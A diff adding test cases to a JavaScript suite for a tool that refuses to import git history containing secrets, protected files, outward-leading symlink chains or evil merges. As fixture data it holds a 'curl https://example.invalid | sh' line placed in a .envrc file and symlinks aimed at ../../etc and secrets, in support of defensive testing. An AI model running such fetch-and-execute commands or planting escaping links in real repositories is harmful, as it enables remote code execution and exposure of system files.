@@ -123,6 +123,38 @@ describe("refused in quarantine: no ref moves, and the candidate never reaches t
       tgit(paths.repo, "checkout", "-qf", `toolroll/code-${thread.id}`);
       tgit(paths.repo, "merge", "-q", "--allow-unrelated-histories", "--no-edit", "outside");
     }, "merge"],
+    ["a secret added in one commit and taken out in the next (history, not just the net change)", () => {
+      commit({ "src/config.js": keyLine() });
+      commit({ "src/config.js": "const key = process.env.KEY;\n" });
+    }, "secret"],
+    ["a protected file added in one commit and removed in the next", () => {
+      commit({ "pkg/.envrc": "curl https://example.invalid | sh\n" });
+      tgit(paths.repo, "rm", "-q", "pkg/.envrc");
+      tgit(paths.repo, "commit", "-qm", "take it back");
+    }, "protected"],
+    ["a chain of links that leads out: a -> b, b -> ../../etc", () => {
+      symlinkSync("../../etc", join(paths.repo, "b"));
+      symlinkSync("b", join(paths.repo, "a"));
+      tgit(paths.repo, "add", "a", "b");
+      tgit(paths.repo, "commit", "-qm", "links");
+    }, "symlink"],
+    ["a chain each of whose links stays inside alone: dir/up -> .., dir/out -> up/..", () => {
+      mkdirSync(join(paths.repo, "dir"));
+      symlinkSync("..", join(paths.repo, "dir", "up"));
+      symlinkSync("up/..", join(paths.repo, "dir", "out"));
+      tgit(paths.repo, "add", "dir/up", "dir/out");
+      tgit(paths.repo, "commit", "-qm", "links");
+    }, "symlink"],
+    ["an evil merge: a change made only inside a merge of the thread's own commits", () => {
+      tgit(paths.repo, "checkout", "-q", "-b", "side");
+      commit({ "side.txt": "side\n" });
+      tgit(paths.repo, "checkout", "-q", `toolroll/code-${thread.id}`);
+      commit({ "main.txt": "main\n" });
+      tgit(paths.repo, "merge", "-q", "--no-commit", "--no-ff", "side");
+      writeFileSync(join(paths.repo, "src-evil.js"), keyLine());
+      tgit(paths.repo, "add", "src-evil.js");
+      tgit(paths.repo, "commit", "-qm", "merge, with a change of its own");
+    }, "merge"],
     ["a branch that doesn't build on its base", () => {
       tgit(paths.repo, "checkout", "-q", "--orphan", "unrelated");
       tgit(paths.repo, "commit", "-qm", "unrelated", "--allow-empty");
@@ -163,6 +195,22 @@ describe("refused in quarantine: no ref moves, and the candidate never reaches t
     tgit(paths.repo, "commit", "-qm", "link");
     expect(await importNow()).toMatchObject({ ok: true });
   });
+});
+
+test("a new link through a link already in the tree that leads out is refused", async () => {
+  // The project has its own link out of the tree (its business); a thread's link through it leads out too.
+  symlinkSync("../../outside", join(world.project, "ext"));
+  tgit(world.project, "add", "ext");
+  tgit(world.project, "commit", "-qm", "an outward link of the project's own");
+  const made = await prepareFlexibleThread(world.store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
+  if (!made.ok) throw new Error(made.message);
+  ({ thread, paths } = made);
+  const before = projectRefs();
+  symlinkSync("ext/secrets", join(paths.repo, "inner"));
+  tgit(paths.repo, "add", "inner");
+  tgit(paths.repo, "commit", "-qm", "link through ext");
+  expect(await importNow()).toMatchObject({ ok: false, reason: "import-refused", check: "symlink" });
+  expect(projectRefs()).toBe(before);
 });
 
 describe("the thread's repository is attacker input", () => {
